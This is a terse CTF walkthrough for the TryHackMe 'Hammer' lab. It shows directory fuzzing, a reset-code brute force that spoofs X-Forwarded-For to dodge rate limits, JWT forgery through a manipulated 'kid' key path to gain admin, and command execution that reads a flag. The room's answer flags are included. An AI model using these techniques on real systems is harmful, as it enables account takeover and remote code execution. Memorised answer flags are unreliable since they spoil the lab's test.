

https://tryhackme.com/r/room/hammer


https://www.youtube.com/watch?v=T_F44rHKgZY

https://medium.com/@hughbrown123/walk-through-hints-hammer-thm-c2b7cddd1494



_With the Hammer in hand, can you bypass the authentication mechanisms and get RCE on the system?_

```
10.10.62.48

PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste

10.10.62.48:1337  login page

<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->


view-source:http://10.10.62.48:1337/reset_password.php

<script>
let countdownv = ;
        function startCountdown() {
            
            let timerElement = document.getElementById("countdown");
			const hiddenField = document.getElementById("s");
            let interval = setInterval(function() {
                countdownv--;
				 hiddenField.value = countdownv;
                if (countdownv <= 0) {
                    clearInterval(interval);
					//alert("hello");
                   window.location.href = 'logout.php'; 
                }
                timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
            }, 1000);
        }
</script>


forgot password > http://10.10.62.48:1337/reset_password.php



gobuster dir -u http://10.10.62.48:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,html,js

/index.php
/config.php
/reset-password.php
/dashboard.php
/logout.php



ffuf -u http://10.10.62.48:1337/hmr_FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e /  -c

/images/
/js/
/logs/     ---> hmr_logs/


http://10.10.62.48:1337/hmr_logs/

error.logs

[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down



tester@hammer.thm



reset password > tester@hammer.thm

0000 
s:58

Burp Suite > capture > repeater


X-Forwarded-For: 8.89.9.24


https://raw.githubusercontent.com/djalilayed/tryhackme/refs/heads/main/hammer/recovery-code.py

2324

tester@hammer.thm : pass123



/hmr_images/hammer.webp
execute_command.php

jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM3NTg5MzkxLCJleHAiOjE3Mzc1OTI5OTEsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.EspiOmYxu8g1qWeDGmK2oHF5uvy-Irv2-An-C1ZvdSQ


jwt.io --------

{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1737589391,
  "exp": 1737592991,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM3NTkwNTM5LCJleHAiOjE3Mzc1OTQxMzksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.VRiUGyc6k6mDy79R-mFdD5fo0P6xOAWRP74HbjiyG0w

edit to be admin

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM3NTkwNTM5LCJleHAiOjE3Mzc1OTQxMzksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.Ox9fQZetnNXcxyhbSh7p54zWn3iboqob0jDuUId94us


this has the key added

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM3NTkwNTM5LCJleHAiOjE3Mzc1OTQxMzksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.ANF-oiZYQZbJfBDZREqTOQM68aEoTqLBQL3FLoAkFsg


edited /var/www/html/188ade1.key userid 2

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM3NTkwNTM5LCJleHAiOjE3Mzc1OTQxMzksImRhdGEiOnsidXNlcl9pZCI6MiwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.TjrmkOiLBFmkFT68-L-gwSpiDK8p3Q6S3_4wRfEz6xc


burp suit capture the command > repeater > paste in JWT 

cat /home/ubuntu/flag.txt














ls
188ade1.key
composer.json
config.php
dashboard.php
execute_command.php
hmr_css
hmr_images
hmr_js
hmr_logs
index.php
logout.php
reset_password.php
vendor



http://10.10.62.48:1337/188ade1.key

cat 188ade1.key 
56058354efb3daa97ebab00fabd7a7d7


http://10.10.62.48:1337/vendor/




cat /home/ubuntu/flag.txt





****************
https://arslanben.medium.com/tryhackme-hammer-writeup-a7c73db16ebc
***************


What is the flag value after logging in to the dashboard?

THM{AuthBypass3D}

What is the content of the file /home/ubuntu/flag.txt?

thm{runanycommand1337}

```